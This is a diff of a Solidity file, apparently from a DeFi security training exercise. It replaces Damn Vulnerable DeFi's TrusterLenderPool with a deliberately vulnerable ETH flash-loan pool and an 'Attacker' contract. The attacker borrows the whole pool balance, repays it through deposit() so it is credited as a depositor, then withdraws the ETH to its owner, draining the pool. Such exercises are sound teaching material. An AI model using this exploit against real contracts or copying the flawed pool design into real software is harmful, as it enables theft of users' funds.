@@ -1,42 +1,80 @@
 // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
 
-pragma solidity ^0.8.0;
+import {Address} from "./Utils/Address.sol";
 
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import "@openzeppelin/contracts/utils/Address.sol";
-import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
 
-/**
- * @title TrusterLenderPool
- * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
- */
-contract TrusterLenderPool is ReentrancyGuard {
+contract Web3BridgeCXIPool {
+    using Address for address payable;
 
-    using Address for address;
+    mapping(address => uint256) private balances;
 
-    IERC20 public immutable damnValuableToken;
+    error NotEnoughETHInPool();
+    error FlashLoanHasNotBeenPaidBack();
 
-    constructor (address tokenAddress) {
-        damnValuableToken = IERC20(tokenAddress);
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
     }
 
-    function flashLoan(
-        uint256 borrowAmount,
-        address borrower,
-        address target,
-        bytes calldata data
-    )
-        external
-        nonReentrant
-    {
-        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
-        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
-        damnValuableToken.transfer(borrower, borrowAmount);
-        target.functionCall(data);
-
-        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
-        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
     }
 
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        if (balanceBefore < amount) revert NotEnoughETHInPool();
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore) {
+            revert FlashLoanHasNotBeenPaidBack();
+        }
+    }
+}
+
+contract Attacker is IFlashLoanEtherReceiver {
+    // using Address for address payable;
+
+    Web3BridgeCXIPool pool;
+
+    address owner;
+
+    constructor(address _pool) {
+        pool = Web3BridgeCXIPool(_pool);
+        owner = msg.sender;
+    }
+
+    function onlyOwner() private view {
+        require(msg.sender == owner, "only owner");
+    }
+
+    function withdraw() public {
+        onlyOwner();
+        pool.withdraw();
+        uint256 bal = address(this).balance;
+        (bool success, ) = owner.call{value: bal}("");
+        require(success, "failed withdraw");
+    }
+
+    function execute() external payable override {
+        // do some stuff
+
+        // return funds to pool
+        // uint256 bal = address(this).balance;
+        // (bool success, ) = address(pool).call{value: bal}("");
+        // require(success, "execution failed");
+        uint256 bal = address(this).balance;
+        pool.deposit{value: bal}();
+    }
+
+    function initiateFlashLoan() public {
+        pool.flashLoan(address(pool).balance);
+    }
+
+    receive() external payable {}
 }
